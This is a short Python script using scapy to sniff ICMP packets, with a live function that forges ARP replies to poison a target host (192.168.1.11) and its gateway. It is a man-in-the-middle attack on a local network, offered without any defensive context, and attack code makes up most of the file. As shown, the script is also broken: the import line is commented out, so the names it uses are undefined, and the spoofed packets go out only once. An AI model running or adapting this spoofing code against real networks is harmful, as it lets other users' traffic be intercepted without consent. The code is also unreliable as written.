# from scapy.all import sniff, IP, ICMP
#
# def capture_packet(packet):
#     if IP in packet and ICMP in packet:
#         print(packet.summary())
#         print("icmp Detected")
#
# interface_name = "Wi-Fi"
#
# capture_filter = "icmp"
#
# sniff(iface=interface_name, prn=capture_packet, filter=capture_filter)














# from scapy.all import ARP, ICMP, sniff, sendp
#
#
def arp_spoof(target_ip, gateway_ip):
    # Craft ARP packets for ARP spoofing
    arp_packet_target = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip)
    arp_packet_gateway = ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip)

    # Send ARP packets to perform ARP spoofing
    sendp(arp_packet_target, verbose=False)
    sendp(arp_packet_gateway, verbose=False)


def capture_packet(packet):
    if ICMP in packet:
        print("ICMP packet detected:")
        print(packet.summary())


def main():
    # Target device IP address and gateway IP address
    target_ip = "192.168.1.11"
    gateway_ip = "192.168.1.1"

    try:
        # Start ARP spoofing to intercept packets
        arp_spoof(target_ip, gateway_ip)

        # Sniff packets on the network interface
        sniff(prn=capture_packet, filter="icmp", store=0)

    except KeyboardInterrupt:
        print("Stopping ARP spoofing and exiting...")


if __name__ == "__main__":
    main()
